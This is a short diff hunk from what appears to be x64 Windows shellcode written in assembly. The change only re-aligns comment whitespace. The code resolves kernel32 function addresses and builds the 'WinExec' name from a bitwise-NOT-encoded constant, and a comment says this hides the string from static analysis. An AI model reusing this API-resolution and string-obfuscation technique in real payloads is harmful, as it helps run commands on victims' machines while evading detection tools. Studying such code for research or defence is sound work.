@@ -83,12 +83,12 @@ add rax, r8                 ; RAX = Kernel32.<API> = RVA kernel32.<API> + kernel
 push rbx                    ; place the return address from the api string call back on the top of the stack
 ret                         ; return to API caller
 
-apis:                   	; API Names to resolve addresses
-							; WinExec | String length : 7
+apis:                       ; API Names to resolve addresses
+			    ; WinExec | String length : 7
 xor rcx, rcx
 add cl, 0x7                 ; String length for compare string
 mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec 
-not rax 					;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
+not rax 		    ;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
 shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
 push rax
 push rcx                    ; push the string length counter to stack
